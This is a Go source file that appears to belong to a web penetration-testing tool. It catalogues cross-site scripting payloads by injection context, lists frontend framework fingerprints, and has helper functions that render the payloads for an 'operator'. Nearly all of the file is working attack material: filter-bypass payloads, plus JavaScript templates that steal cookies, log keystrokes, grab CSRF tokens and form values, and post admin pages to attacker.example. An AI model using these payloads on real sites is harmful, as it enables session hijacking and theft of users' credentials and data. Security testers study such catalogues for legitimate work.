package webgo

import (
	"fmt"
	"strings"
)

// XSS — Cross-Site Scripting. Payload catalogue organized by context, plus
// framework escaping tells.
//
// The single most important thing: match the injection context. A payload
// that works inside <script> breaks inside an attribute; one that works in
// an attribute breaks inside a URL. The catalogue below is ordered by
// context so the operator picks the right family.
//
//   html        — raw <script> / <img onerror> in HTML body
//   attribute   — breaking out of `"`, `'`, unquoted attrs
//   url         — javascript: URI, data: URI, in URL-href context
//   script      — inside an existing <script> block (JS context)
//   css         — CSS injection (less common, useful for old-browser vectors)
//   dom         — DOM-based sinks
//   jsonp       — callback parameter
//   markdown    — passed through a markdown renderer

// XSSPayload is one payload with its context.
type XSSPayload struct {
	Context string
	Label   string
	Payload string // may contain {JS} placeholder
	Notes   string
}

// XSSPayloads is the payload catalogue.
var XSSPayloads = []XSSPayload{
	// HTML body context — direct tag injection
	{Context: "html", Label: "script tag", Payload: `<script>{JS}</script>`, Notes: "Fails against any CSP with script-src 'self'"},
	{Context: "html", Label: "img onerror", Payload: `<img src=x onerror="{JS}">`, Notes: "No script tag — often survives naive filters"},
	{Context: "html", Label: "svg onload", Payload: `<svg onload="{JS}">`, Notes: "SVG context"},
	{Context: "html", Label: "body onload", Payload: `<body onload="{JS}">`, Notes: "Requires the injection to be in <body>"},
	{Context: "html", Label: "details ontoggle", Payload: `<details open ontoggle="{JS}">`, Notes: "Fires without user interaction"},
	{Context: "html", Label: "marquee onstart", Payload: `<marquee onstart="{JS}">`, Notes: "Legacy but still works"},
	{Context: "html", Label: "iframe srcdoc", Payload: `<iframe srcdoc="<script>{JS}</script>">`, Notes: "Bypasses some parent-context filters"},
	{Context: "html", Label: "video source", Payload: `<video><source onerror="{JS}">`, Notes: "Media element event"},

	// Attribute context — need to close the attribute first
	{Context: "attribute", Label: "double-quoted break", Payload: `"><script>{JS}</script>`, Notes: "If we're inside attr=\"<here>\""},
	{Context: "attribute", Label: "single-quoted break", Payload: `'><script>{JS}</script>`, Notes: "If we're inside attr='<here>'"},
	{Context: "attribute", Label: "unquoted break (space)", Payload: ` onmouseover="{JS}`, Notes: "If the attribute has no quote"},
	{Context: "attribute", Label: "unquoted break (slash)", Payload: `/<script>{JS}</script>`, Notes: "Same, alternate form"},
	{Context: "attribute", Label: "href in <a>", Payload: `javascript:{JS}`, Notes: "Direct — click required, or use autofocus"},

	// URL context
	{Context: "url", Label: "javascript URI", Payload: `javascript:alert(1)`, Notes: "Modern browsers block in href without user gesture in many cases"},
	{Context: "url", Label: "data URI", Payload: `data:text/html,<script>{JS}</script>`, Notes: "Blocked by Chrome for top-level navigation"},
	{Context: "url", Label: "javascript URI (tab)", Payload: "java\tscript:{JS}", Notes: "Tab inside scheme — bypasses some regex filters"},

	// Script context — already inside <script>
	{Context: "script", Label: "break string", Payload: `';{JS};//`, Notes: "If we're in <script>var x = '<here>'"},
	{Context: "script", Label: "break template literal", Payload: "`;{JS};//", Notes: "Inside backticks"},
	{Context: "script", Label: "close script and reopen", Payload: `</script><script>{JS}</script>`, Notes: "Breaks out of a nested script tag"},
	{Context: "script", Label: "JSON context", Payload: `"};{JS};//`, Notes: "Inside an object literal"},

	// CSS context
	{Context: "css", Label: "expression (old IE)", Payload: `x{background-image:url(javascript:{JS})}`, Notes: "Old IE only"},
	{Context: "css", Label: "style break", Payload: `</style><script>{JS}</script>`, Notes: "If injection is inside a <style> block"},

	// DOM sinks — same payloads work, delivery differs
	{Context: "dom", Label: "location.hash sink", Payload: `#<img src=x onerror="{JS}">`, Notes: "If location.hash goes to innerHTML"},
	{Context: "dom", Label: "postMessage sink", Payload: `{"cmd":"<img src=x onerror={JS}>"}`, Notes: "If the page dispatches messages into innerHTML"},

	// JSONP callback
	{Context: "jsonp", Label: "callback name", Payload: `?callback=<script>{JS}</script>`, Notes: "If the callback name is reflected raw"},

	// Markdown passthrough
	{Context: "markdown", Label: "image alt", Payload: `!["onerror="{JS}](x)`, Notes: "Broken-out markdown image alt"},
	{Context: "markdown", Label: "raw html", Payload: `<img src=x onerror="{JS}">`, Notes: "If the renderer allows raw HTML"},
}

// XSSFingerprint tells for common frontend frameworks.
type XSSFingerprint struct {
	Framework string
	Marker    string
	Meaning   string
}

// XSSFingerprints is the fingerprint table.
var XSSFingerprints = []XSSFingerprint{
	{"React", `data-reactroot`, "React renders this attribute on the root element"},
	{"React", `data-reactid`, "Older React versions"},
	{"Angular", `ng-version=`, "Angular renders this on <app-root>"},
	{"Angular", `ng-app`, "AngularJS 1.x — see $sce bypasses"},
	{"Vue", `data-v-`, "Vue scoped style attribute"},
	{"Vue", `__vue__`, "Vue instance attached to element (dev builds)"},
	{"Svelte", `data-svelte`, "Svelte component marker"},
	{"Next.js", `__NEXT_DATA__`, "Next.js embeds its state in a script tag"},
	{"Nuxt", `__NUXT__`, "Nuxt embeds state"},
	{"Rails", `csrf-token`, "Rails csrf meta tag"},
	{"Django", `csrfmiddlewaretoken`, "Django form token"},
	{"ASP.NET", `__VIEWSTATE`, "ASP.NET page state (also a deserialization target)"},
}

// JS payload templates — the {JS} placeholder content. Kept short.
var JSCommonPayloads = map[string]string{
	"alert":       `alert(1)`,
	"cookie":      `fetch('http://attacker.example/c?'+document.cookie)`,
	"keylog":      `document.onkeypress=e=>fetch('http://attacker.example/k?c='+e.key)`,
	"beef_hook":   `(new Image).src='http://attacker.example/h?c='+encodeURIComponent(document.cookie)`,
	"redirect":    `location='http://attacker.example/'`,
	"fetch_admin": `fetch('/admin').then(r=>r.text()).then(t=>fetch('http://attacker.example/e',{method:'POST',body:t}))`,
	"csrftoken":   `document.querySelectorAll('meta[name=csrf-token]').forEach(e=>fetch('http://attacker.example/t?t='+e.content))`,
	"domwalk":     `[...document.querySelectorAll('input')].map(i=>i.name+'='+i.value).forEach(v=>fetch('http://attacker.example/i?'+v))`,
}

// RenderXSSPayload substitutes {JS} with the given JS template.
func RenderXSSPayload(p XSSPayload, js string) string {
	if js == "" {
		js = JSCommonPayloads["alert"]
	}
	return strings.ReplaceAll(p.Payload, "{JS}", js)
}

// ListXSSForContext returns all payloads for a given context.
func ListXSSForContext(ctx string) []XSSPayload {
	var out []XSSPayload
	for _, p := range XSSPayloads {
		if p.Context == ctx {
			out = append(out, p)
		}
	}
	return out
}

// XSSContextNames returns the context list.
func XSSContextNames() []string {
	seen := map[string]bool{}
	var out []string
	for _, p := range XSSPayloads {
		if !seen[p.Context] {
			seen[p.Context] = true
			out = append(out, p.Context)
		}
	}
	return out
}

// FormatXSSReport gives a quick text dump for the operator.
func FormatXSSReport(js string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "js=%q\n\n", js)
	for _, p := range XSSPayloads {
		fmt.Fprintf(&b, "[%s] %s\n  %s\n  # %s\n\n",
			p.Context, p.Label, RenderXSSPayload(p, js), p.Notes)
	}
	return b.String()
}
